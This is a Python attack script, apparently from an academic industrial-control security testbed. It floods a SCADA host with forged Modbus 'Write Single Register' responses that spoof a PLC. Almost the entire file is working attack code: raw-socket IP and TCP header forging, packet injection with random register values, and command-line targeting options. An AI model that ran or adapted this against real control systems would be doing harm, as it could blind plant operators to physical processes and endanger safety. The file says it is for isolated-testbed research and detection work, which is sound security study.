#!/usr/bin/env python3
"""
ASCEND-PG attacks/denial_of_view.py

MITRE ATT&CK for ICS: T0815 — Denial of View.

Simulates an attack that corrupts the SCADA operator's view of the
physical process by flooding the SCADA host with forged Modbus "Write
Single Register" (FC06) responses. This prevents the SCADA client
from receiving legitimate PLC responses, effectively blinding the
operator.

Implementation:
  - Opens a raw TCP connection to the SCADA host
  - Sends forged Modbus FC06 responses with corrupted register values
  - The SCADA client receives a mix of legitimate and forged data,
    making it unable to maintain an accurate process view

Detection: Suricata catches the forged holding register writes
(SID 9000001).

Run this ON THE ATTACKER HOST:
    python3 attacks/denial_of_view.py --scada-ip 10.0.0.20 --plc-ip 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import random
import socket
import struct
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

MODBUS_PORT = 502


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def build_forged_fc06_response(transaction_id: int, unit_id: int,
                               register_addr: int, value: int) -> bytes:
    """Build a forged Modbus FC06 (Write Single Register) response.

    This mimics what a PLC would send back after a successful write,
    but the SCADA client never sent a write request — it's receiving
    unsolicited responses that corrupt its register map.
    """
    # FC06 response is identical to the request:
    # function code (1) + register address (2) + register value (2)
    pdu = struct.pack(">BHH", 0x06, register_addr, value)
    length = len(pdu) + 1  # +1 for unit ID
    header = struct.pack(">HHHB", transaction_id, 0, length, unit_id)
    return header + pdu


def _build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    """Build a minimal IPv4 header for raw TCP injection."""
    import struct
    version_ihl = (4 << 4) | 5  # IPv4, 5*4=20 bytes header
    total_len = 20 + payload_len
    identification = 0
    flags_offset = 0x4000  # Don't Fragment
    ttl = 64
    protocol = 6  # TCP
    checksum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    header = struct.pack(">BBHHHBBH4s4s",
        version_ihl, 0, total_len, identification, flags_offset,
        ttl, protocol, checksum, src, dst)
    # Compute IP checksum
    s = sum(struct.unpack("!10H", header))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    checksum = ~s & 0xFFFF
    header = struct.pack(">BBHHHBBH4s4s",
        version_ihl, 0, total_len, identification, flags_offset,
        ttl, protocol, checksum, src, dst)
    return header


def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
                       flags: int, payload: bytes) -> bytes:
    """Build a minimal TCP header with data offset and checksum."""
    import struct
    data_offset = 5  # 5 * 4 = 20 bytes
    window = 65535
    checksum = 0
    urgent = 0
    header = struct.pack(">HHIIBBHHH",
        src_port, dst_port, seq, ack,
        (data_offset << 4) | flags, window, checksum, urgent)
    # Pseudo-header for checksum
    src_bytes = socket.inet_aton("10.0.0.66")  # attacker IP
    dst_bytes = socket.inet_aton("10.0.0.20")  # SCADA IP
    pseudo = struct.pack(">4s4sBBH", src_bytes, dst_bytes,
                          0, 6, len(header) + len(payload))
    s = sum(struct.unpack("!%dH" % ((len(pseudo) + len(header) + len(payload) + 1) // 2),
             pseudo + header + payload + b'\x00'))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    checksum = ~s & 0xFFFF
    header = struct.pack(">HHIIBBHHH",
        src_port, dst_port, seq, ack,
        (data_offset << 4) | flags, window, checksum, urgent)
    return header


def _send_raw_tcp(sock, dst_ip: str, src_ip: str, dst_port: int, payload: bytes):
    """Send a forged TCP packet with payload via raw socket."""
    import struct
    import random
    src_port = random.randint(1024, 65535)
    seq = random.randint(0, 2**32 - 1)
    ack = 0
    flags = 0x02  # SYN (but we just need to send data, use PSH|ACK)
    flags = 0x18  # PSH | ACK
    tcp_header = _build_tcp_header(src_port, dst_port, seq, ack, flags, payload)
    ip_header = _build_ip_header(src_ip, dst_ip, len(tcp_header) + len(payload))
    sock.sendto(ip_header + tcp_header + payload, (dst_ip, 0))


def run_denial_of_view(scada_ip: str, plc_ip: str, port: int,
                       count: int, delay: float, log_path: Path) -> dict:
    """Flood the SCADA host with forged Modbus responses.

    Uses raw sockets to inject forged FC06 responses directly to the
    SCADA host without needing a TCP handshake (SCADA host doesn't
    listen on port 502 as a server).

    Returns dict with stats.
    """
    stats = {"packets_sent": 0, "errors": 0}

    print(f"[denial_of_view] Targeting SCADA at {scada_ip}:{port}")
    print(f"[denial_of_view] Forging responses as if from PLC at {plc_ip}")
    print(f"[denial_of_view] Sending {count} forged packets with {delay}s delay")

    try:
        # Use raw socket to inject packets without TCP handshake
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        print(f"[denial_of_view] Raw socket created, injecting forged responses")
    except OSError as e:
        print(f"[denial_of_view] Raw socket failed (need root): {e}")
        print(f"[denial_of_view] Falling back to TCP connect")
        raw_sock = None

    # Fallback: TCP connect (will fail if nothing listens on port 502)
    tcp_sock = None
    if raw_sock is None:
        try:
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_sock.settimeout(3.0)
            tcp_sock.connect((scada_ip, port))
            print(f"[denial_of_view] Connected to SCADA host via TCP")
        except OSError as e:
            print(f"[denial_of_view] TCP connect failed: {e}")
            return stats

    try:
        for i in range(count):
            tx_id = (i % 65536) + 1
            unit_id = 1
            # Target common register addresses that SCADA polls
            reg_addr = random.randint(0, 50)
            # Corrupted value — random garbage to poison the view
            value = random.randint(0, 65535)

            forged = build_forged_fc06_response(tx_id, unit_id, reg_addr, value)

            try:
                if raw_sock:
                    # Build IP+TCP headers for raw injection
                    _send_raw_tcp(raw_sock, scada_ip, plc_ip, port, forged)
                else:
                    tcp_sock.sendall(forged)
                stats["packets_sent"] += 1
            except (socket.timeout, OSError) as exc:
                stats["errors"] += 1
                if stats["errors"] <= 3:
                    print(f"[denial_of_view] Send error on packet {i}: {exc}")

            if delay > 0:
                time.sleep(delay)

            if (i + 1) % 25 == 0:
                print(f"[denial_of_view] Progress: {i + 1}/{count} packets sent")

    except (socket.timeout, OSError) as exc:
        print(f"[denial_of_view] Connection error: {exc}")
        stats["errors"] += 1
    finally:
        if raw_sock:
            raw_sock.close()
        if tcp_sock:
            tcp_sock.close()

    return stats


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Denial of View (T0815) — flood SCADA with "
                    "forged Modbus responses to corrupt operator view"
    )
    parser.add_argument("--scada-ip", required=True,
                        help="SCADA client IP to flood")
    parser.add_argument("--plc-ip", default="10.0.0.1",
                        help="PLC IP to spoof responses from (default: 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=MODBUS_PORT,
                        help=f"Target port (default: {MODBUS_PORT})")
    parser.add_argument("-c", "--count", type=int, default=100,
                        help="Number of forged packets (default: 100)")
    parser.add_argument("-d", "--delay", type=float, default=0.05,
                        help="Delay between packets in seconds (default: 0.05)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0815",
        "action": "denial_of_view_start",
        "target": args.scada_ip, "spoofed_source": args.plc_ip,
        "count": args.count,
    })

    stats = run_denial_of_view(
        args.scada_ip, args.plc_ip, args.port,
        args.count, args.delay, log_path,
    )

    log_event(log_path, {
        "stage": "attack", "technique": "T0815",
        "action": "denial_of_view_end",
        "target": args.scada_ip,
        "packets_sent": stats["packets_sent"],
        "errors": stats["errors"],
    })

    print(f"\n[denial_of_view] Done — {stats['packets_sent']} forged packets sent, "
          f"{stats['errors']} errors")


if __name__ == "__main__":
    main()
